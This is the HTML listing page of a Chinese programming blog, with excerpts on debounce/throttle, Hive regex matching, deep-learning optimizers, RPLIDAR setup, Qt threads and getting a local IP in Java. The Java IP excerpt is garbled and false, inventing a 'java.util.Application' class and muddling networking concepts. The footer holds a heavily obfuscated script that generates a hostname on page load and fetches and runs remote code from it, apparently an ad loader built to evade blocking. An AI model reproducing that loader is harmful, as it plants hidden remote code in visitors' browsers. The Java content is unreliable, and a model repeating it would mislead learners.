"k越大，图谱中出现的节点越多；k越小，图谱中出现的节点越少"
4.2 Top N Top N是选择标准之一，用于筛选出具有最高影响力的N篇文章。具体而言，Top N将会筛选出引用次数排名前N的文章，这些文章具有较高的学术影响力和重要性
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c38049a316d2663bb85730229221b4da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/032e7a60ab3db955b324afacf3831b53/" rel="bookmark">
			防抖与节流总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近复习到了防抖与节流，今天就把防抖与节流给总结一下吧。
防抖 什么是防抖 防抖是一种常用的前端优化技术，它可以有效地减少在用户频繁触发某些事件（比如鼠标滚动、窗口缩放等）时产生的多次执行函数的问题。这样可以避免函数被频繁调用，从而提高页面的性能和用户体验。
什么时候使用防抖 输入框搜索：在用户输入关键字搜索时，若是有着自动补全事件，防抖就可以避免频繁请求，提高搜索效率。按钮点击：在按钮被连续点击时，防抖函数可以避免重复触发事件，从而避免页面卡死以及产生不可预期的后果，提高用户体验。页面滚动：在页面滚动时，避免频繁地触发滚动事件，提高性能和体验。窗口缩放：在窗口大小发生改变时，避免频繁地触发事件，等待窗口调整完成后，再执行resize事件中的代码，提高性能和体验。表单验证：在表单验证时，避免频繁地触发验证事件，提高效率和体验。 防抖的实现原理 定时器实现防抖是在事件触发后设定一个延时时间，在这个时间内如果再次触发了同样的事件，就会重新开始计时，直到延时时间结束后才会执行函数。
防抖函数的代码 function debounce(fn,delay){ let timer = null; return function(){ let context = this; let args = arguments; if(timer){ clearTimeout(timer); timer = null; } timer = setTimeout(()=&gt;{ fn.apply(context,args); },delay); } } 这里传入的参数fn是我们需要处理的函数，delay是我们设定的延时时间。
防抖的缺陷 无法立即执行函数，需要等待一定的时间后才能执行。
如果在等待时间内再次触发函数，就会重新计时，可能会导致函数执行的次数少于期望值。
如果设置的时间过长，会导致用户等待过久，降低用户体验。
节流 什么是节流 节流是一种优化性能的技术，主要用于减少某些事件的触发频率。在一些需要频繁触发事件的场景中，如果不加以限制，可能会造成系统负载过高，甚至导致卡顿或崩溃。节流技术就是通过限制事件触发的频率，来减少系统负载，提高性能。常见的节流方式包括定时器节流和时间戳节流。
什么时候使用节流 频繁的鼠标移动、滚动事件：比如浏览器滚动条的滚动、鼠标移动、拖拽等操作，会频繁触发事件，使用节流可以减少事件的触发次数。
窗口大小改变事件：当用户调整浏览器窗口大小时，会触发窗口大小改变事件，这个事件会在用户停止调整窗口大小后才会触发，因此使用节流可以减少事件的触发次数，提高性能。
输入框输入事件：比如用户在输入框中输入文字时，会触发输入事件，如果用户连续输入多个字符，会频繁触发事件，使用节流可以减少事件的触发次数，提高性能。
搜索框搜索事件：用户在搜索框中输入关键字进行搜索时，搜索框会频繁触发搜索事件，使用节流可以减少事件的触发次数，提高性能。
延迟加载：在滚动到页面底部时，可以使用节流控制请求的频率，减少服务器的压力和网络带宽的消耗。
防止重复提交：比如用户连续多次点击提交按钮，会触发多次提交事件，使用节流可以减少事件的触发次数，避免重复提交。
节流的实现原理 时间戳实现节流 时间戳实现节流的原理是在触发事件时，记录一个时间戳，然后每次触发事件时都与上一次记录的时间戳进行比较，如果时间间隔大于等于指定的时间间隔，则执行函数并更新时间戳。如果时间间隔小于指定的时间间隔，则不执行函数。
定时器实现节流 定时器实现节流的原理是在执行时创建一个定时器，定时器到期则执行函数，并将变量置为null。在此期间如果再次触发节流函数，则判断定时器是否为空，为空则重新创建一个定时器，否则直接返回。
节流函数的代码 时间戳实现节流 // fn是我们需要包装的事件回调, interval是时间间隔的阈值 function throttle(fn, interval) { // last为上一次触发回调的时间 let last = 0 // 将throttle处理结果当作函数返回 return function () { // 保留调用时的this上下文 let context = this // 保留调用时传入的参数 let args = arguments // 记录本次触发回调的时间 let now = +new Date() // 判断上次触发的时间和本次触发的时间差是否小于时间间隔的阈值 if (now - last &gt;= interval) { // 如果时间间隔大于我们设定的时间间隔阈值，则执行回调 last = now; fn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/032e7a60ab3db955b324afacf3831b53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/748f58184d90d514c9cad531a7ea8200/" rel="bookmark">
			Hive中SQL通配符like与正则匹配rlike(regexp)的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hive 中可以用 like 和 rlike 进行模糊匹配，like 采用的是 SQL 通配符，而 rlike (regexp)采用的是正则匹配。
1、like % 代替 0 或多个字符
_ 代替一个字符
举个例子：
-- 返回值为 TRUE spark-sql&gt; select 'aaa' like '%a%'; true Time taken: 2.04 seconds, Fetched 1 row(s) -- 返回值为 TRUE spark-sql&gt; select 'aaabb' like '%a%'; true Time taken: 0.123 seconds, Fetched 1 row(s) 2、rlike rlike 采用正则表达式，以下总结几个常用的
\： 转义用，序列 \ 匹配
^： 匹配输入字符串开始的位置
$： 匹配输入字符串结尾的位置
*： 零次或多次匹配前面的字符或子表达式
?： 零次或一次匹配前面的字符或子表达式
x|y： 匹配 x 或 y
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/748f58184d90d514c9cad531a7ea8200/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61f29b95643f8fd03ac1d187ce9adac3/" rel="bookmark">
			深度学习神经网络优化器总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习神经网络优化器有以下几种： 1. 梯度下降法（Gradient Descent） 2. 随机梯度下降法（Stochastic Gradient Descent） 3. 批量梯度下降法（Batch Gradient Descent） 4. 动量法（Momentum） 5. Nesterov加速梯度法（Nesterov Accelerated Gradient） 6. 自适应梯度算法（Adagrad） 7. 自适应矩估计算法（Adam） 8. 自适应学习率算法（AdaDelta） 9. RMSprop算法 10. L-BFGS算法 以上是常见的深度学习神经网络优化器，每种优化器都有其特点和适用场景。 1. 梯度下降法（Gradient Descent）：梯度下降法是最基本的优化器，通过计算损失函数对参数的梯度来更新参数。适用于小数据集和简单模型，但容易陷入局部最优解。 2. 随机梯度下降法（Stochastic Gradient Descent）：随机梯度下降法每次只使用一个样本来计算梯度，更新参数。适用于大数据集和复杂模型，但容易受到噪声的影响。 3. 批量梯度下降法（Batch Gradient Descent）：批量梯度下降法每次使用一批样本来计算梯度，更新参数。适用于中等大小的数据集和模型，但可能会陷入局部最优解。 4. 动量法（Momentum）：动量法在梯度下降的基础上加入了动量项，可以加速收敛并减少震荡。适用于大数据集和复杂模型。 5. Nesterov加速梯度法（Nesterov Accelerated Gradient）：Nesterov加速梯度法在动量法的基础上加入了Nesterov加速项，可以更准确地估计下一步的位置。适用于大数据集和复杂模型。 6. 自适应梯度算法（Adagrad）：自适应梯度算法根据每个参数的历史梯度来调整学习率，可以自适应地调整不同参数的学习率。适用于稀疏数据集和非平稳数据。 7. 自适应矩估计算法（Adam）：自适应矩估计算法结合了动量法和自适应梯度算法，可以自适应地调整不同参数的学习率和动量。适用于大数据集和复杂模型。 8. 自适应学习率算法（AdaDelta）：自适应学习率算法根据每个参数的历史梯度和更新量来调整学习率，可以自适应地调整不同参数的学习率。适用于稀疏数据集和非平稳数据。 9. RMSprop算法：RMSprop算法根据每个参数的历史梯度来调整学习率，可以自适应地调整不同参数的学习率，并且可以减少震荡。适用于大数据集和复杂模型。 10. L-BFGS算法：L-BFGS算法是一种基于牛顿法的优化器，可以快速收敛并且不容易陷入局部最优解。适用于小数据集和简单模型。 一、 梯度下降法是一种常用的优化算法，用于求解最小化损失函数的参数。其基本思想是通过不断地沿着损失函数的负梯度方向更新参数，直到达到损失函数的最小值。 具体来说，梯度下降法的步骤如下： 1. 初始化参数：随机初始化模型参数。 2. 计算损失函数：使用当前参数计算损失函数的值。 3. 计算梯度：计算损失函数对每个参数的偏导数，即梯度。 4. 更新参数：沿着梯度的反方向更新参数，使得损失函数的值减小。 5. 重复步骤2-4，直到达到预设的停止条件（如达到最大迭代次数或损失函数的变化小于某个阈值）。 梯度下降法有多种变体，如批量梯度下降法（Batch Gradient Descent）、随机梯度下降法（Stochastic Gradient Descent）和小批量梯度下降法（Mini-batch Gradient Descent）等。这些变体的区别在于每次更新参数时使用的样本数量不同，对应着不同的计算效率和收敛速度。 二、
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61f29b95643f8fd03ac1d187ce9adac3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b25bf5ea31eeb3f05a73c9fcd07bf9ba/" rel="bookmark">
			java获取本机ip的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java中有一个类叫 Application，可以用来获取本机 ip，也可以用来获取网络连接的信息，例如网络上有什么主机、需要访问本机的主机名等。但是这个类只能在本机上使用，如果要访问外部的主机，还需要使用其它的方法。 首先在主程序中写一个 java. util. Application （）方法，然后在子类中定义一个 Application类，如图1所示。 通过这个类可以获取到本机 ip地址。当然，这个类不是只能在本机上使用，其他地方也可以使用。 2.在子类中定义一个 Application方法（方法名根据需要自己取）。 4.用上述方法获得本机 ip地址（方法名和子类都是自定义的）。 5.调用 application方法来获取本机 ip地址。 6.如果在 Java程序中使用了 Debug模式，那么在这一步可以用 Debug模式来获取本机 ip地址。但是如果采用的是动态 IP，那么就要用动态 IP协议来获取本机 ip地址。
一、获取动态 IP
动态 IP是指路由器根据一定的规则，动态分配 IP地址，当主机从一个路由器转发数据时，路由器将这个 IP地址保存在自己的内存中，并在下一个周期根据该 IP地址计算出下一个周期的 IP地址。在动态 IP中，主机的 ip地址不固定。也就是说，在一次连接成功后，这个 ip地址是不会改变的。需要获取的是主机当前的动态 IP地址，即“本地动态 IP地址”。 Java中采用的动态 IP协议是 TCP/IP协议中的IPv4协议。IPv4协议与 Internet没有直接关系，其主要目标是在因特网上提供虚拟专用网服务。而 TCP/IP协议则是用于因特网上通信的三大基本协议之一。TCP/IP是建立在 TCP/IP之上的一整套规范，它规定了在因特网上进行通信时应遵循的一些规则（包括数据报格式、网络层传输格式、报头结构等）和接口规范。
二、网络协议
IP地址是一组数字，表示网络上的主机所处的位置。为了能让网络上所有的主机都能使用 IP地址，就需要一个协议。这个协议叫 IP协议，也叫网络协议。 在 TCP/IP协议中有三种不同的方式来表示网络中的主机地址。 第一种方式是用网络号来表示，第二种方式是用 IP地址来表示，第三种方式是用端口号来表示。因此，在 TCP/IP协议中，也是使用 IP地址和端口号来表示的。这里使用的是第三种方式。 要了解 IP地址和端口号之间的关系，可以看一下下面这个图： 根据图3所示，可以看到两个端口之间的连接情况。如果两个端口之间只有一条数据线，那么就是1;如果有两条数据线，那么就是2;如果有三条数据线，那么就是3。 对于三个端口之间的连接情况，我们可以用下面这个图来表示： 如图4所示，可以看出三个端口之间都有一条数据线。而这条数据线对应着相应的网络协议。
三、基本配置
1.首先打开 cmd命令窗口，在命令窗口中输入 cmd，回车。 2.在命令窗口中输入 ipconfig，回车。
四、本地配置
1.在 Java程序中用 Application方法获取本机 ip地址时，并不是直接调用本机的 application方法，而是使用一个 java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b25bf5ea31eeb3f05a73c9fcd07bf9ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de86538fcceb2b4edd057a5b3604bddd/" rel="bookmark">
			RPLIDAR A1在Ubuntu下的使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、 RPLIDAR A1激光雷达参数介绍 更多资料见官网：https://www.slamtec.com/cn/Lidar/A1
二、安装环境 1、Ubuntu20.04操作系统
2、ROS机器人操作系统
三、源码安装方法 1、建立工作空间
mkdir -p ~/rplidar_ws/src 2、安装rplidar-ros 雷达驱动
cd ~/rplidar_ws/src git clone https://github.com/ncnynl/rplidar_ros.git 3、编译代码
cd .. catkin_make 4、配置并刷新环境变量
source devel/setup.bash echo source ~/rplidar_ws/devel/setup.bash &gt;&gt; ~/.bashrc** 四、运行激光雷达 1、查看并绑定设备端口
ls -l /dev |grep ttyUSB sudo chmod 666 /dev/ttyUSB0 2、运行驱动程序并在rviz中显示点云
roslaunch rplidar_ros view_rplidar.launch 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1d8238907cc71595085d6ede7b96439/" rel="bookmark">
			QT的多线程和多进程，定时器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QT中的线程 NAME pthread_create - create a new thread SYNOPSIS #include &lt;pthread.h&gt; int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg); Compile and link with -pthread. QT 不能使用死循环，但是在线程中可以！
任务函数访问UI的方法 #include "mainwindow.h" #include "ui_mainwindow.h" #include &lt;QDebug&gt; //添加linux C 的线程 #include &lt;pthread.h&gt; #include &lt;unistd.h&gt; //全局变量的UI Ui::MainWindow *all_ui; MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent) , ui(new Ui::MainWindow) { ui-&gt;setupUi(this); //获取UI的地址 all_ui = ui; } MainWindow::~MainWindow() { delete ui; } //利用线程参数传递 void *task(void *arg) { //获取UI的地址 Ui::MainWindow *ui=(Ui::MainWindow *)arg; static int i=0; while (1) { ui-&gt;label-&gt;setNum(i++); //找不到UI sleep(1); } } //利用全局变量传递 void *task2(void *arg) { static int i=0; while (1) { all_ui-&gt;label_2-&gt;setNum(i--); sleep(1); } } void MainWindow::on_pushButton_clicked() { //开启一个线程 pthread_t tid; pthread_create(&amp;tid,NULL,task,ui); //把UI 传递给任务函数 } void MainWindow::on_pushButton_2_clicked() { //开启一个线程 pthread_t tid; pthread_create(&amp;tid,NULL,task2,NULL); //把UI 传递给任务函数 } QT 官方的线程类 Header:#include qmake:QT += coreInherits:QObject 官方的线程使用例子：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1d8238907cc71595085d6ede7b96439/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/152/">«</a>
	<span class="pagination__item pagination__item--current">153/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/154/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>